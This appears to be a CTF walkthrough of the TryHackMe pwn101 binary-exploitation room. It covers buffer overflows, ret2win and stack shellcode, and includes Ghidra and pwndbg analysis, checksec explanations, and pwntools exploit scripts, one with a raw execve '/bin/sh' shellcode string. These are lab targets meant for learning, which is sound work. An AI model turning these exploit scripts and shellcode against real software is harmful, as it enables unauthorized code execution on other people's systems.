---
title: "Binary101"
date: 2024-01-05
layout: "simple"
categories: [Tryhackme, Medium]
tags: [Binary exploitation]
image: https://i.ibb.co/cgYN2Kr/th-3134630742.jpg
---


Hello guys and welcome to my walkthrough along this journey of binary exploitation. In this wreiteup we shall be handling the pwn101 room on [tryhackme](https://tryhackme.com/room/pwn101). Before jumping into this room, there are some prerequisites to complete the challenges:

    1. C programming language
    2. Assembly language (basics)
    3. Some experience in reverse engineering, using debuggers, understanding low-level concepts
    4. Python scripting and pwntools
    5. A lot of patience
    
Let's learn.

## 101

### Introduction

So we first begin with some easy task to handle and looking at the description ```This should give you a start: 'AAAAAAAAAAA'```
we get an idea that this might be a simple buffer overflow. A buffer overflow or buffer overrun is an anomaly whereby a program writes data to a buffer beyond the buffer's allocated memory, overwriting adjacent memory locations.
Example would look like.
![1](https://i.ibb.co/3RLRrq8/example-overflow.png)

### Disassembly in Ghidra

We are now going to fire up ghidra which would help us in dissasembly. We are then going to disassemble the main function to get an idea of how the program runs. 

Here we can notice three things, first is that we have a dangerous function ***gets()***. This reads a line from stdin into the buffer pointed to by s until either a terminating newline or EOF, which it replaces with a null byte ('\0'), otherwise the function will continue to store characters past the end of the buffer allowing us to over write the adjacent memory.

Next we can also see that we have a funtion which calls to system. This is interesting.

![2](https://i.ibb.co/h2SyLr5/ghidra.png)

### Exploit 
To exploit this is very simple all we need to do is provide the program with 60 bytes and boom we spawn a shell. This can be easily done using the following ```cyclic 60```, which creates a cyclic pattern. Then we can feed that to the program and boom we have a shell.

![3](https://i.ibb.co/XbNcmQQ/shell.png)

## 102

### Intoroduction

So for the next challenge we are required to modify a variable's value. This occurs when data larger than the allocated memory space (buffer) is written into that buffer. As a result, it can overwrite adjacent memory, including variables.

### Disassembly in Ghidra

![4](https://i.ibb.co/N2bFgf6/ghidra.png)

Here we can see that we have a buffer set to 104, meaning we can input data larger than 104 and be able to modify the variables that come in after. We can now see that we have two variables that have been defined. We can also see an if function that checks if the two variables are equal to some values, if not the program exits. Since we now know what the two values should be equal to, let us modify them.

### Exploit

After the disassembly we can now come up with our very own exploit. This tiem we are going to be using pwntools to craft an exploit. Looking at our disassembled code in ghidra we can see that the values for parameter 1 and parameter 2 should be ```0xc0ff33 and 0xc0d3``` respectively. Due to little endianness we first pass in the second parameter and then the first parameter. Little Endianness refers to the byte order used to store data in computer memory. In a system that uses Little Endianness, the least significant byte (the "little end") of a multi-byte value is stored at the lowest memory address, while the most significant byte (the "big end") is stored at a higher memory address. To check for endianness you can use ```rabin2 -I binary```.

```
from pwn import *

p = process("./pwn102.pwn102") # runs the binary locally
#p = remote("ip_provided", 9002) # runs remotely

param_1 = p32(0xc0ff33) # packed in 32 bit since it is short
param_2 = p32(0xc0d3)

payload = b'A' * 104 # filling the buffer with bunch of A's
payload += param_2 
payload += param_1

p.sendlineafter("?", payload) # sending the payload
p.interactive() # spawn a shell
```
## 103

### Introduction

Here we are met by a ret2win challenge, what this means is that we are required to call a function which does something that is not normal, example spawn a shell or in case of a CTF it prints out the flag. We can start by doing simple binary analysis for example checking the binary protections using ```checksec```. 

``` 
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
Arch: amd64-64-little
    This line specifies the architecture of the binary. "amd64" refers to the x86-64 architecture, a common architecture for modern desktop and server CPUs. "64-little" indicates that it's a 64-bit architecture (as opposed to 32-bit) and uses little-endian byte ordering.

RELRO: Partial RELRO
    RELRO stands for "RELocation Read-Only." It's a security feature in the ELF (Executable and Linkable Format) binaries (commonly used in Unix-like systems). "Partial RELRO" means that some parts of the binary's memory (like the Global Offset Table - GOT) are protected from certain types of attacks, but not completely. Full RELRO provides more robust protection by making more sections read-only after the program starts.

Stack: No canary found
    A stack canary is a security mechanism used to detect buffer overflows. It's a random value placed before the return address on the stack. "No canary found" means the binary doesn't implement this particular protection, potentially leaving it vulnerable to certain types of buffer overflow attacks.

NX: NX enabled
    NX (No eXecute) is a security feature that prevents code execution from areas of memory marked as data, reducing the risk of certain types of attacks, like buffer overflow attacks that attempt to execute malicious code injected into data areas. "NX enabled" indicates this protection is active, which is a good security measure.

PIE: No PIE (0x400000)
    PIE stands for "Position Independent Executable." When PIE is enabled, the base address of the program is randomized on each execution, making it harder for attackers to predict memory addresses. "No PIE (0x400000)" means the binary is loaded at a fixed address (0x400000 in this case), which might make certain types of attacks easier if other vulnerabilities are present.

Well since we have No Pie, this makes our life much easier since we can pass the address of the "win" function and call it, ret2win. We can also see that we have no canary meaning that we can actually overflow the buffer and over write the adjacent memory. With that said, now we can disassemble the binary. Here I will use be using a debugger to view the functions.

### Disassembly in PWNDBG

```
pwndbg> info functions
All defined functions:

Non-debugging symbols:
0x0000000000401000  _init
0x0000000000401030  strncmp@plt
0x0000000000401040  puts@plt
0x0000000000401050  system@plt
0x0000000000401060  printf@plt
0x0000000000401070  read@plt
0x0000000000401080  strcmp@plt
0x0000000000401090  setvbuf@plt
0x00000000004010a0  __isoc99_scanf@plt
0x00000000004010b0  _start
0x00000000004010e0  _dl_relocate_static_pie
0x00000000004010f0  deregister_tm_clones
0x0000000000401120  register_tm_clones
0x0000000000401160  __do_global_dtors_aux
0x0000000000401190  frame_dummy
0x0000000000401196  setup
0x00000000004011f7  rules
0x0000000000401262  announcements
0x00000000004012be  general
0x0000000000401378  bot_cmd
0x00000000004014e2  discussion
0x000000000040153e  banner
0x0000000000401554  admins_only
0x000000000040158c  main
0x0000000000401680  __libc_csu_init
0x00000000004016e0  __libc_csu_fini
0x00000000004016e4  _fini
pwndbg> 

```
Interesting enough we can set our focus to this functions first.

```
0x0000000000401196  setup
0x00000000004011f7  rules
0x0000000000401262  announcements
0x00000000004012be  general
0x0000000000401378  bot_cmd
0x00000000004014e2  discussion
0x000000000040153e  banner
0x0000000000401554  admins_only
0x000000000040158c  main
```
So we can see that we have a very interesting functions named admins_only hmm can this be our win function? We can then disassemble this function in our debugger. 

```
pwndbg> disass admins_only 
Dump of assembler code for function admins_only:
   0x0000000000401554 <+0>:	push   rbp
   0x0000000000401555 <+1>:	mov    rbp,rsp
   0x0000000000401558 <+4>:	sub    rsp,0x10
   0x000000000040155c <+8>:	lea    rax,[rip+0x1d04]        # 0x403267
   0x0000000000401563 <+15>:	mov    rdi,rax
   0x0000000000401566 <+18>:	call   0x401040 <puts@plt>
   0x000000000040156b <+23>:	lea    rax,[rip+0x1d0a]        # 0x40327c
   0x0000000000401572 <+30>:	mov    rdi,rax
   0x0000000000401575 <+33>:	call   0x401040 <puts@plt>
   0x000000000040157a <+38>:	lea    rax,[rip+0x1d0e]        # 0x40328f
   0x0000000000401581 <+45>:	mov    rdi,rax
   0x0000000000401584 <+48>:	call   0x401050 <system@plt>
   0x0000000000401589 <+53>:	nop
   0x000000000040158a <+54>:	leave
   0x000000000040158b <+55>:	ret
End of assembler dump.
```

Ah yes we can see that we have a call to system, what this does is call system and spawn a shell. 

### Exploit

So after we have everything we need we can come up with an exploit. We can first run the binary to see how it runs normaly. 

![5](https://i.ibb.co/DLvBbC0/intro.png)

So going to option 3 we can get a hint that there is where we have the vuln.

```
from pwn import *

p = process("./pwn103.pwn103") 
#p = remote("thm_ip", 9003)

admins_addr = p64(0x401554) 
return_addr = p64(0x401677)

payload = b'A' * 40 # found buffer at 40
payload += return_addr
payload += admins_addr

pause()

p.sendlineafter(":", "3")
p.sendline(payload)
p.interactive()

```
Here, ```admins_addr``` and ```return_addr``` are two addresses in the binary, represented as 64-bit packed values (p64). The return function serves as the address the program will attempt to return to after completing a function call.
The payload starts with 40 bytes of 'A's to fill the buffer until a potential buffer overflow point is reached. Then, it appends the return_addr followed by admins_addr in an attempt to redirect program execution to the admins_addr after overwriting the return address.

```pause()``` is used to pause the script execution, giving you time to attach a debugger if needed before the interaction with the vulnerable program begins.
```sendlineafter()``` sends the string "3" to the program, which directs the program to the general channel where we found the vuln hint.
```p.interactive()``` hands over the control of the program to you interactively, allowing you to send further commands manually and explore the program's state after the exploit attempt.

## 104
### Introduction

First of all we are going to do some file checks, to see the binary protections and determine the file type

```
pwn104.pwn104: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=60e0bab59b4e5412a1527ae562f5b8e58928a7cb, for GNU/Linux 3.2.0, not stripped
```

We can see that the binary is a 64 bit Least Significant Byte executable, in other words it uses little endian. The binary is dynamically linked to a LIBC and it is not stripped. 

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX unknown - GNU_STACK missing
    PIE:      No PIE (0x400000)
    Stack:    Executable
    RWX:      Has RWX segments
```
we can also see the protections around it, you can refer back to pwn103 above to see what this protections mean.

So interesting enough we can see that under NX, it is unknown, this could potentialy mean that we can execute shellcode on the stack. Running the binary may confirm this 

```
I think I have some super powers 💪
especially executable powers 😎💥

Can we go for a fight? 😏💪
I'm waiting for you at 0x7ffe12e976e0
```
There are no interesting functions so we will not be dissassembling this, rather we can go through with our exploit

### Exploit

So we can see that the program gives us some address so we can maybe grab that and this location could be where we can execute shellcode 

Next we are going to need shellcode, so there are two ways to get shellcode. One way being using shellcraft which is a tool which generates shellcode, the other way is using the shellcode database. 

Here i am going to get one from the database [shellstrom](http://shell-storm.org/shellcode/files/shellcode-603.html)

Smooth, next we need to fill the buffer which will allow us to execute shellcode. 

```
from pwn import *

p = process("./pwn104.pwn104")
#p = remote(thm_ip, 9004)


p.recvuntil(b'at ')
output = p.recv()
print(output)
bufferlocation = p64(int(output, 16))
shellcode = b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05'

payload = shellcode
payload += b'A' * (88 - len(shellcode))
payload += bufferlocation

p.sendline(payload)
p.interactive()
```
You can use also use shellcraft to create your payload.
